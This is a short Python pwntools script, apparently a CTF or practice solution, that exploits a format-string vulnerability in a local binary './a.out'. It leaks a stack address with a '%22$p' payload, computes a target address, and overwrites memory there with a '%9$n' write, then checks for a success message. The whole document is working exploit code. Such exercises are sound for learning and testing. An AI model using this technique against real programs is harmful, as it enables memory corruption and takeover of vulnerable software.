from pwn import *

context.log_level = 'debug'
r = process("./a.out")

pause()
r.sendline(b"%22$p,")
stack_addr = int(r.recvuntil(b',')[:-1], 16)
print(f"{hex(stack_addr) = }")
arg1_addr = stack_addr-(0x7fffffffdf49-0x7fffffffdaf0)+0x14
print(f"{hex(arg1_addr) = }")
r.sendline(b"aa%9$naa"+p64(arg1_addr))
pause()
r.recvuntil(b"yeah!!!\n")
print("success")